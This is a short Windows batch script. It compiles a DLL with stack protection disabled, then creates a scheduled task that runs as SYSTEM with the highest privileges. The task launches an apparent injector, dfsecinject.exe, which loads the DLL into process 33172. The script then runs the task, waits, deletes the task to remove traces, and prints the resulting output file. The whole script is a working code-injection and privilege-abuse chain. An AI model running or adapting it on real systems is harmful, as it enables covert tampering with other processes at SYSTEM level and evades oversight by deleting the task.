@echo off
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul
cd /d C:\Users\User\trackA
cl /nologo /std:c++17 /O2 /EHsc /MT /GS- /LD dfufunc.cpp /Fe:dfufunc.dll /link user32.lib > ufunc_build.log 2>&1
echo UB=%errorlevel%
type ufunc_build.log
schtasks /create /tn dfa_uf /tr "C:\Users\User\trackA\dfsecinject.exe 33172 C:\Users\User\trackA\dfufunc.dll" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f >nul
schtasks /run /tn dfa_uf
ping -n 15 127.0.0.1 >nul
schtasks /delete /tn dfa_uf /f >nul
type ufunc.txt
